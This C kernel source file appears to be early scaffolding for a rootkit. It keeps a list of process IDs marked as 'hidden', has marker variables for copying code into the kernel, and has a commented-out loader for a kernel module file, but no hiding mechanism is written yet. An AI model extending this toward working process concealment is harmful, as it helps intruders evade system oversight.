char kernel_start = 0;

#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/tty.h>

/*
 * Macros.
 */
#define PREFIX_MAX 32
#define LOG_LINE_MAX (1024 - PREFIX_MAX)

/*
 * Types
 */
struct pid_list_node {
    pid_t nr;
    struct task_struct *task;
    struct pid_list_node *next;
};

/*
 * Declarations
 */
int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
void pinfo(const char *fmt, ...);
void vpinfo(const char *fmt, va_list args);
void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr);
pid_t pid_list_pop(pid_t nr);
//void *readfile(const char *file, size_t *len);

/*
 * Linux Kernel functions.
 */
void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
struct pid * (*f_find_vpid)(pid_t nr);


/*
 * Variable definition
 */
struct pid_list_node *pid_list_head = NULL, *pid_list_tail = NULL;

void kernel_test(void) {

    pid_list_create();

    hide_pid(3924);
    hide_pid(3925);

	pid_list_destroy();
}

int hide_pid(pid_t nr) {
	struct pid *pid;
	
	pid = f_find_vpid(nr);
	if (pid) {
		pid_list_push(nr);
		pinfo("Ok");

		return 0;
	} else {
		pinfo("PID not found.");
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	if (pid_list_pop(nr) == nr) {
		pinfo("Ok");

		return 0;
	} else {
		pinfo("PID is not hidden.");
	}
	
	return -1;
}

void pid_list_push(pid_t nr) {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		pid_list_tail->next = node;
		pid_list_tail = node;
		node->next = NULL;
		node->nr = nr;
	} else {
		pinfo("pid_list_push f_kmalloc");
	}
}

pid_t pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;

	prev = node = pid_list_head;
	while(node) {
		if (node->nr == nr) {
			prev->next = node->next;
			if (pid_list_tail == node) {
				pid_list_tail = prev;
			}
			kfree(node);

			return nr;
		}
		prev = node;
		node = node->next;
	}

	return -1;
}

void pid_list_create() {
	struct pid_list_node *node;

	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->nr = 0;

	pid_list_head = pid_list_tail = node;
}

void pid_list_destroy() {
	while(pid_list_head->next) {
		unhide_pid(pid_list_tail->nr);
	}
}

/*
void *readfile(const char *file, size_t *len) {
	int fd;
	void *buf;
	struct stat fd_st;

	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);
	fd = open(file, O_RDONLY, 0);
	if (fd >= 0) {
		newfstat(fd, &fd_st);
		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
		if (buf) {
			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
				*len = fd_st.st_size;
				close(fd);
				return buf;
			} else {
				pinfo("can't read lkm");
			}
		} else {
			pinfo("create_load_info kmalloc error");
		}

		close(fd);
	} else {
		pinfo("can't open lkm");
	}
	set_fs(old_fs);

	return NULL;
}
*/
// from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
// from linux-source/kernel/printk/printk.c
void pinfo(const char *fmt, ...) {
    va_list args;

    va_start(args, fmt);
    vpinfo(fmt, args);
    va_end(args);
}

void vpinfo(const char *fmt, va_list args) {
    struct tty_struct *my_tty;
    const struct tty_operations *ttyops;
    static char textbuf[LOG_LINE_MAX];
    char *str = textbuf;
    size_t str_len = 0;

    /*
     * tty struct went into signal struct in 2.6.6
     */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,5) )
    /*
     * The tty for the current task
     */
    my_tty = current->tty;
#else
    /*
     * The tty for the current task, for 2.6.6+ kernels
     */
    my_tty = get_current_tty();
#endif
    ttyops = my_tty->driver->ops;

    /*
     * If my_tty is NULL, the current task has no tty you can print to
     * (ie, if it's a daemon).  If so, there's nothing we can do.
     */
    if (my_tty != NULL) {

		str_len = vscnprintf(str, sizeof(textbuf), fmt, args);

        /*
         * my_tty->driver is a struct which holds the tty's functions,
         * one of which (write) is used to write strings to the tty.
         * It can be used to take a string either from the user's or
         * kernel's memory segment.
         *
         * The function's 1st parameter is the tty to write to,
         * because the same function would normally be used for all
         * tty's of a certain type.  The 2nd parameter controls
         * whether the function receives a string from kernel
         * memory (false, 0) or from user memory (true, non zero).
         * BTW: this param has been removed in Kernels > 2.6.9
         * The (2nd) 3rd parameter is a pointer to a string.
         * The (3rd) 4th parameter is the length of the string.
         *
         * As you will see below, sometimes it's necessary to use
         * preprocessor stuff to create code that works for different
         * kernel versions. The (naive) approach we've taken here
         * does not scale well. The right way to deal with this
         * is described in section 2 of
         * linux/Documentation/SubmittingPatches
         */
        (ttyops->write) (my_tty,      /* The tty itself */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
                         0,   /* Don't take the string
                                 from user space        */
#endif
                    	 str, /* String                 */
                         str_len);        /* Length */

        /*
         * ttys were originally hardware devices, which (usually)
         * strictly followed the ASCII standard.  In ASCII, to move to
         * a new line you need two characters, a carriage return and a
         * line feed.  On Unix, the ASCII line feed is used for both
         * purposes - so we can't just use \n, because it wouldn't have
         * a carriage return and the next line will start at the
         * column right after the line feed.
         *
         * This is why text files are different between Unix and
         * MS Windows.  In CP/M and derivatives, like MS-DOS and
         * MS Windows, the ASCII standard was strictly adhered to,
         * and therefore a newline requirs both a LF and a CR.
         */

#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
        (ttyops->write) (my_tty, 0, "\015\012", 2);
#else
        (ttyops->write) (my_tty, "\015\012", 2);
#endif
    }
}

char kernel_end = 0;
